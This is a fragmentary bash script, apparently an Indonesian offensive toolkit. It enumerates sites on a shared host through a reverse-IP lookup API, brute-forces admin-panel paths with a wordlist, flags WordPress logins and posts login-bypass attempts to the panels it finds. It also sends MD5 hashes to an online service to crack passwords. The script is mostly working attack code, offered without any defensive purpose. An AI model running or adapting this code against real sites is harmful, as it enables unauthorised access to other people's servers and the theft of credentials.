...
adminfin() {
for i in $(cat $wordlistadmin)
  do
    _ngecurl=$(curl -s -o /dev/null -w "%{http_code}" $site/$i -L)
    ngecurl=$(curl -s -L "$site/$i")
    if echo "$ngecurl" | grep -Po "User|user|password|Password|Username|username|email|Email|Log in|Login|sign in|Sign in|masuk|Masuk|Daftar" >/dev/null #[ "$_ngecurl" = "200" ]
       then
           if echo "$ngecurl" | grep -Po "WordPress|wp-admin|wp-uploads|wp-content|wp-login" >/dev/null
             then
               echo "[!] Wordpress : $site/$i"
             else
               echo -e "[*] F O U N D : $site/$i"
               echo "$site/$i" >> Result_admin_finder.txt
            fi
          break
       else
         echo -e "[!] NOT FOUND : $site/$i"
    fi
done
}
...
for admin in /home/ /home.php /Dashboard.php /Dashboard /index.php
  do
...
cek=$(curl -s -L -X POST "${post}" -H "Content-Type: application/x-www-form-urlencoded" -d "${postdata}")
...
case $n in
   ...
   4) clear
      ...
      1) clear
         ...
         read wordlist
         echo "[+] Ambil domain:$lightgreen $line"
         rm -rf result_reverseip.txt Result_admin_finder.txt
         ngerevip=$( curl -s "http://api.hackertarget.com/reverseiplookup/?q=$line" -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" >> result_reverseip.txt )
         echo "$ngerevip"
         for site in $(cat result_reverseip.txt)
          do
            adminfin
         done
         for target in $(cat Result_admin_finder.txt)
          do
             echo -e "                         [ Procesing ]\nSite: $target" 
           bypass
          done
...
do
   echo "$liste" | cut -d "$del" -f2 | while read hash
     do
        ...
        pass=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s "http://www.nitrxgen.net/md5db/${hash}" -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0")
